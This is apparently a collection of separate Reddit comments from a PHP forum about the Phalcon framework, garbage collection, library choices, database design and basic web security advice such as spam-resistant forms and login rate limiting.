TD;LR; Fast and great but not for beginners. Firstly it is insanely fast! Great choice when your doing APIs or data manipulation. Also once you understand how it all goes together, it makes a lot of sense and for the most part gets out of your way to get stuff done. Also the plugin/library mechanics are really easy to use and make it so much easier to extend without bulking out your MVC code. On the other hand the docs aren't brilliant, you need to have enough skill to be able to research what you need and time to do it in (less so the more you know). I would recommend working from an existing example to begin with and then remove the stuff you don't need. Also the one thing which can slow it down is what they call PHQL. Basically because Phalcon is written in C they needed a way to convert MySQL into something C can run. This is a performance bottleneck because it adds an extra layer of conversion. Either use the inbuilt criteria ORM (slightly faster) or use custom MySQL statements.
Yes, found gunk in the config file. WOrking now.
Yes, found gunk in the config file. WOrking now.
He did, but we got him unbanned. It was overzealousness on the part of the spam filter.
Well I guess in that context. I'd consider it any time where you're assigned one task in a given scope and a decision is made at some point to extend that scope for some reason. Whether it is adding an unexpected feature because it should be easy, or because you realize you've created a hacky mess that is going to stay that way unless you modify things to be more architecturally sound. I admit though, there is probably a better way to state what I was trying to get at.
I'm fine with self-validating models as long as they have no external dependencies. Once you need to access data that the model doesn't already contain, it's time to use a service instead.
Are there reference counts happening when the object is created as one of the arguments? e.g function foo($obj) { } foo(new Bar); //or function bar() { return new Bar; } foo(bar());
Well it would definitely make sense to make it as a PECL first, then when it has become a PECL it would take a strong argument to get it into the core. I'm not going to try and push for it to go into the core, I don't think anyone would vote +1 on Markdown in the core, I think PHP supporting CommonMark as "the one solution to Markdown" in the core would be politic as fuck and tbh I don't care about that argument one bit. Making a Composer package and a PECL is enough for me to feel content that the "Markdown in PHP" situation has been resolved. Never say never though. Maybe PHP 8? :)
Yep, decent amounts of experience. Runs very well, super fast. Not easy to debug, due to being Zephir/C based, but the devs are always on hand and ready to help out. Love what they're doing, it's really a perfect API-building framework, you won't find a faster one. Another perk of the entire effort is being able to use the new Zephir "language" to convert existing PHP apps to really fast closed source PHP extensions.
There is a [PHP extension](https://github.com/AOP-PHP/AOP) that makes AOP in PHP both easy to write (no fancy annotations) and performant. The readme also provides an example use case, which is **debugging**. It's much easier inject AOP than configuring your container to return a decorated dependency. Also it allows to instrument 3rd party code that doesn't provide events or you don't have control upon. It prevents injecting an event emitter everywhere you potentially need something to be extended.
In my area, it's not FUD, it's reality. California may be a different story though.
i would prefer assertions. somethings like try { $modelObject-&gt;assertEquals($anotherModel); // models are equal continue the flow of the operation } catch (AssertEqualsException $e){ // the models are not equal }
I'm sorry, but I must: If you don't catch that, does it mean you can't handle the truth? Also: class Conception { public function __construct($needle, $haystack) { (in_array($needle, $haystack)) &amp;&amp; $this-&gt;throwIn(); throw new NotInception(); } protected function throwIn() { throw new Inception(); } }
Has anyone used both this and Imagine? If so, what are the pros and cons of each? 
Yes, this is possible and goes by the name of "incremental GC" (or generational GC in a particular variation). But afaik doing incremental GC can be a lot more complicated. As PHP primarily does refcounting the CC algorithm is relatively simple as is usually doesn't matter.
Sentinel and other Cartalyst code isn't open source so immediately I have a couple questions: * Is Sentinel really all that? Pros and cons? * The (non-code) extras provided by the subscription - support etc, is it worth the money? * Is the business model working for Cartalyst?
This is /r/php now? Great, just great.
Performance is our top priority.We're all seasoned developers so a steep learning curve isn't an issue for us if it helps in the long run. There seems to be an active community on their forums with quick replies. I guess you're meaning beyond that?
Seems to be that Phalcon is great for APIs, but not for more than that. Would you agree with that?
&gt;&gt;&gt; As to why the problem went unnoticed for so long, it seems that the GC is not able to be observed by profilers, so whenever we looked at profiles to improve things we obviously did not spot the issue. &gt;&gt; Observing internal time is pretty important for any profiler. &gt; Yes it is definitely a failure of the tooling and I hear it is actually being worked on. [Source](https://news.ycombinator.com/item?id=8686934)
Because PHP 7 is a while away and we run on Debian so it'll be an even longer wait. We need a solution now. It's not like PHP 5.6 will magically disappear. It'll be around for quite a while.
Yup, I just need to make sure he has a budget that can handle the clean up. Removing the code is easy, but finding out how it was uploaded will be tricky. There are a bunch of custom coded websites on the same account, each one has file access to the others, so any one of them could be the culprit. From looking into the link posted above, it looks like it was uploaded to the server via an upload form. (I know all the sites allow image uploads) so at this point, I am thinking it was one of the image uploads that did not properly check the file types that allowed it in.
&gt; it's really a perfect API-building framework, Would you say that's all it's good for? Not for a website?
But from what I can see it's still compiled?
Quick question for you about this, I know its possible on the same server, but is it possible on the same hosting CPanel account? Since all the websites are on the same account, would I be able to safely separate them?
Tips/Tools for Performance: - Ensure all service containers use deferred loading. - Varnish - Redis/Memcached - Cache for DB - Nginx - MariaDB/Percona to replace MySQL - [Vitess](https://github.com/youtube/vitess) - HHVM (if you're not going with Phalcon) If you're using a templating engine (e.g. Twig, Smarty) this is going to be your greatest performance bottleneck, cache as much as you can in varnish and inject the rest via ESI or AJAX.
In my experience, server CPU cycles are cheaper than than a developer's time and energy. You might be better off spending the time saved on performance optimization and strategies for scaling.
Since no-one has yet mentioned it, would you use /r/PHPhelp for support requests in the future? I believe /u/PHP is more for news and announcements. Thanks! 
I like the way you think
Your form should include: a) a unique token (e.g. salt+microtime hash) so spammers have to request the page before submitting anything b) a field (hidden with CSS) named "from" which, if populated, automatically fails the entry so spammers can easily out themselves c) if usability (think "customer service" versus "sales inquiry") isn't a big concern: CAPTCHA, preferably third-party because good CAPTCHA is hard
Thank God someone said it. I was just waiting for the authoritative sounding blog, referring to Composer, recommending everyone disable GC "for performance", which would get linked as a reply to every SO question ever about a poorly performing PHP application.
Yeah. The same. I just call them components because that's what Symfony calls them. My mistake for implying they're different. There are so many, each takes care of a distinct commonly used aspect of an actual framework. My favorite is probably dependency injection and event dispatcher. Just using those two alone has made me a better programmer and architect. My most used is console and httpfoundation.
Well we're moving away from our current inhouse built framework as it makes development rather slow. So it's a matter of which direction we go in. 
I'd have to add Carbon to the list. So brilliant. https://github.com/briannesbitt/Carbon 
Thanks. b) is something I am not doing at the moment. But, seems like a good idea-- especially for anything not subject to deeper access controls. Sign up forms in my opinion don't have access controls, anyone that can navigate to the site can use the form... the hidden field real people using a traditional browser would weed out most bogus submissions.
Surely you mean your "application written in PHP" is your bottleneck? PHP itself doesn't become a bottleneck until you're Facebook-scale, or you've done something terribly, terribly wrong.
Why not both GC's? and then just choose which GC you want at PHP build time? Or would they both be far too intricate?
Chrome for one.
If the database is being modified. Check the permissions as you would anything else. You are saying you check if the user owns the content and THEN lets them modify it. Idk if the wording gets me, but I guess I would then be checking before if the user owns content (Usually by checking their login session variables), and then I show them a form to edit content, and when they hit submit, they are verified again for their permissions before I even open a database call. 
I really like the [chriso/klein](https://github.com/chriso/klein.php) router.
Programming has been taken over by hipsters, of course that's all you'll hear. PHP is still used by many, it's just not the "hip" new language. I love PHP and they keep improving it so i'll continue to use it. Only thing I don't care for is the syntax they used for namespaces
Since I'm not this smart.. would this be capable of running on a separate thread ( in theory )? I mean its supposed to catch things that in theory aren't referenced so... I know php could benefit from multi threading on many other avenues... But specifically this issue, I'm curious...
I haven't used it as much as I would like, but I have some experience with it, and the limited about of experience I have with it was always pleasant. I will say, it was kind of a bitch to get it working with nginx to start with. But once you get it setup, it's amazingly fast.
Although I do agree that using Phalcon with APIs is super simple, I wouldn't agree that it would be its __only__ use. It's a bit cumbersome to work with, in a real and advance way, but it's still very useful.
If the bottleneck you currently have is PHP, then Phalcon will really help you out. My advice is to time the slowest function that you have in PHP, and rewrite it in Phalcon, and compare the speeds. If the increase is justifiable, then it's worth the expense.
If you're form is used to send email, make sure it's not open to mail header injection (if you let the user set the From: field, you're at risk). Easiest way to avoid that is to use a library and not the `mail()` function directly.
Imagine hasn't hit 1.0 yet, and while it's an exciting looking package, its semver says it's not stable yet.
I would suggest the following: Have a table with all admin templates. When the client decides to create a new template, offer the admin templates as a basis for creating their own. This way the admin templates are never used outright, and thus don't need to be treated as full templates in the database. Second, the customer template database doesn't get polluted with a bunch of templates they are not using. When the customer choose to create a new template based off of an admin template, then the admin template gets copied to the customer templates table, associated with their business, and an editor fired up to get started editing the template (or however it works with your SaaS). This keeps your database clean of unnecessary duplication and provides customers with a number of templates to choose from to get started that can be edited immediately and are not going to be interfered with by future updates to another table or anything like that. (i.e., you can update the admin templates later without messing with customer templates)
Oh not at all, it's quite good at powering websites, too. But you won't be up and running as fast as you would be with a slower but more popular framework like Laravel or Symfony. If you can tough it out through the learning curve and the sometimes flimsy docs, I can almost guarantee you won't regret giving it a shot.
When Laravel 5 comes out - you'll be able to do the check inside the FormRequest object as part of the authorisation check.
@sfc1971 &gt; If you EVER interview for a company where they only hire seniors. RUN! Like the one I already work for :), I totally agree with much of what you said. Use shit people use, build products on the back of other commonly used products, because when your senior dev walks in front of a bus, if you can't find someone to maintain the new product they sunk their money into, you've just thrown a lot of money into the trash.
@foolandhismoney better general documentation I think.
You may be missing the point... we want to give them a few that they may or may not use - depending on their flexibility. We don't want to make them do a few more steps to get those templates -- they just have to have them. The power of this functionality is that they are able to create their own or disable the admin templates to use whatever they need. LE: for an action, we will give them the ability to send out a business proposal, for example, and after they get accepted, or win the project they can send a thank you - that's the whole logic behind this functionality. The sorting is important because the first template will be the default one when sending out and, the owner wants it. 
I don't think speed is really an issue here, i am trying to avoid data duplication that is unnecessary, and creates a LOT of other programming tasks that we would not have to do otherwise. To back up my claim, i've ran a join on a ~35000 entry table, it took 0.0008 seconds - i believe this number is very good, and considering we're not going to have more than 150-200... maybe 1000 entries after a few years (i doubt anyone will start creating tons of templates... maybe change one of the admins and that's it), i doubt this join will ever be an issue.
It's been extremely stable in production for us on a few properties. Serving a few hundred thousand users. Node still hasn't hit 1.0. Not everyone follows semver to the tee :)
Yep! Say we do this: `foo (new Bar);` It'll create an instance of Bar. That object gains a reference when it's passed to foo (it's now the `$obj` variable inside the function), so it has a reference count of 1, then when the function returns, it loses a reference (that variable's gone), so it now has a reference count of 0 and is destroyed.
Adam, from last 2 months i have posted total 5 posts. This project is not viral. Where do i go for seeking suggestions ? I found reddit to be helpful and i accept critics. You say it doesn't bring anything new to the table. Instead, it would be nice if you can suggest me some features. I am not asking you to develop them for me. 
Check out [Webird](https://github.com/perchlayer/webird). Its a Phalcon framework based off of Vokuro and it uses [Webpack](http://webpack.github.io/) (browserify competitor) for integration for front end bundling.
Hi, i thank you for your feedback. I have already worked on the feedback. You had also mentioned that there is no DI for models. I cleared that to you in my previous post. Look, i understand i might be bugging the community, but my intention is really not to shout and scream. I am just trying to improve my project with constructive comments and critics.
The docs are very good for quite a number of things and only fizzle out in the more exotic directions. The Phalcon forum is now fairly active whereas even two years ago it didn't have much going on there when it migrated from Google Groups.
I once was referred to the Zephir code by Mr. Phalcon himself and it was incredibly easy to read. Its IMO easier to read than C or PHP.
There is an experimental JIT for Zephir but its not at all the recommended method of usage. I'm not sure how the JIT works but it seems that it is an attempt to make PHP extension building dramatically easier. Ha, restarting the fpm every time would get pretty damn old. My take is that Zephir is rad and eventually will target HHVM as well and so will eventually be the preferred way for PHP extension developers to target all environments. They will turn the Oh-Shit moment into the best selling point and they hardly lack the ambition or skill to pull that off. These brilliant C hackers are much better tasked to developing this toolset so that half-rate guys like me can fix basic logic issues when they come up. Eventually I'll be migrating portions of my PHP code to Zephir and that will continue the memory savings while also protecting my source. In short Zephir is rad because you can easily write PHP extensions without all of that grotesque boilerplate.
Well that post was a year ago and while still very true what has changed is that Zephir has become much more mature. They make no mention of PHP7/NG in that post due to the fact that NG wasn't a thing then. Phalcon 1.* will certainly not support NG but version 2 will as it is based upon Zephir. They simply will need to extend the boilerplate of Zephir to allow this. I expect that this will take less than six months to accomplish after NG comes out and it will be available very much in time for usage on your six month release distro of choice. The issue there will be people who are immediately compiling PHP 7 from source.
Okay.. .. .... wat
I'm going to sound grumpy here, but how much does it really matter? You said yourself there wont be huge amounts of data. Pick one, code it up, hide the details, and move on. If it becomes painful, reconsider. Easier said than done sometimes, I know. If your colleague is being really stubborn, go with his plan, on the condition that it's well abstracted. I just feel like if you've come to reddit for further opinions, you've probably already wasted enough time on this. I appreciate that's probably not what you wanted to hear, but that's how I feel :)
thanks for your feedback, really appreciate it.
that doesnt matter, honestly, "users" can never create a performance problem with laravel, that makes it subpar to phalcon, as the bottleneck in those cases will rather be routes, fileservers, database servers etc ... but NEVER your php scripts, the performance difference between phalcon and laravel only matters when we are talking about a lot of very tine fast request - think backends for Large-Scale mobile games, where you have 10+ Million of concurrent players. But for a website, even slow frameworks like zend are still fast enough
I would say that using Phalcon for everything would be quite okay today, the MVC is simple and sufficient. I only have the documentation to complain about, but I hope it will be better in the next version.
Nice presentation \o/ Munin is nice for easilly monitoring your systems though it's not very convenient for profiling your PHP app. We've implemented our own plugins to have req/s, avg response time, std deviation of response time ; it works well, but it's a bit limited to handle complexity of a growing distributed system. So recently we've started using CollectD &amp; StatsD (for collecting data), Graphite (for storing / calculus) and Grafana (front-end for Graphite), so far it's been quite amazing!
After reviewing the code base I really hope no one uses this "framework" to learn php... ・_・ 
Yes, we've wasted some time on this... i wanted an objective opinion on all of this... I just feel that no duplication of data and less steps in the actual development (granted it's a bit more complex, but complex is fun), is worth it. ++ Less chances for errors.
Sony : "You're hired !"
It's odd, he sounds like he's worried about a DoS attack, but hasn't responded to the rate limiting point. If login attempts are silently denied after 15 attempts (by IP or username) then there's no extra DoS risk. 
I’m actually in product management for an APM vendor, and have broad and non-anecdotal perspective of the enterprise software market. And what I see is a change from Java being almost ubiquitous in large enterprise. Why do i think this is happening? More and more large companies are using open source components rather than proprietary middleware; middleware that typically requires Java. The open source components usually support non-Java APIs, and PHP is prevalent due to its popularity. So the trend I see is: **Large Enterprise:** Java dominant but starting to decline in new projects, PHP in new projects **Mid Market:** PHP &amp; Java **Small Business:** PHP Of course I havent been exhuastive; but wanted to share my view. 
A good point. I'd apply a design trade-off there: the blocklist should be by IP block, so a hacker from one country does not spoil the party for a legitimate user in another. 
Sorry not to respond quicker, but that was exactly what I thought.. maybe I am wrong?
Sure, if you enable the setting (which Chrome prompts you to do upon first DL), but not out of the box.
You could use the mail() function (not recommended necessarily) or just use the library swiftmailer as /u/xsanisty suggested: https://github.com/swiftmailer/swiftmailer
I'm in Chicago for the sake of context. My company is always looking for good engineers, and we are not geo-centric. Don't know where you live, but if you like working remotely, drop me a line!
It can be worth emailing users who have been affected and providing a custom link allowing another 15 or whatever attempts: "we have detected unusual activity with your account. Your data has not been compromised. To protect your account and our site web logins using your account have been disabled for x time, use this link to login". The cost of an extra email and an extra 15 rounds of the hashing system (if the attacker has access to the custom link) is pretty minor and attackers can't lock out real users.
Different whois servers return differing amounts of information. Some registries don't even run whois servers - some only provide web based whois services (or even just domain availability checking) - if you're lucky it won't be protected by captcha or session based markers. There's not a lot you can do about it. I'd recommend using a library to do this sort of work - the 2 I found that were any good at all were [phpWhois](https://github.com/phpWhois/phpWhois) and [novutec\WhoisParser](https://github.com/novutec/WhoisParser). I'm currently maintaining [a fork of the WhoisParser library](https://github.com/AllenJB/WhoisParser) that has a number of improvements (mostly to aid use via composer, but also to handle rate limiting and a new parser/template that works better with most whois server output). I'm in the process of contacting the novutec developers about folding my changes back into the original library, but if they aren't interested or don't respond I'll properly publish my version of the library. (Note: Do not consider my fork stable - altho I think I've made most of the major changes I want to now, I am still working on it) Some useful resources: * [Root Whois Watcher Service](https://whois.viathinksoft.de/iana-utils/root-whois-watcher/) and their [list of current TLD whois servers](https://whois.viathinksoft.de/iana-utils/root-whois-watcher/root_whois_list.php) * [IANA TLD database](https://www.iana.org/domains/root/db) * [Public suffix list](https://publicsuffix.org/list/effective_tld_names.dat)
That's a good idea, yes. Or just ask for the email address to be entered at the same time as the username password once the limit has been reached. 
File a pull request that adds &lt;s&gt; around that.
If you think it's bad, check out this one that someone tried to pimp on StackOverflow: * https://github.com/NirjhorAnjum/PHP-NovaFramework * https://github.com/NirjhorAnjum/PHP-NovaFramework/blob/master/login.php * https://github.com/NirjhorAnjum/PHP-NovaFramework/blob/master/view/my_view.php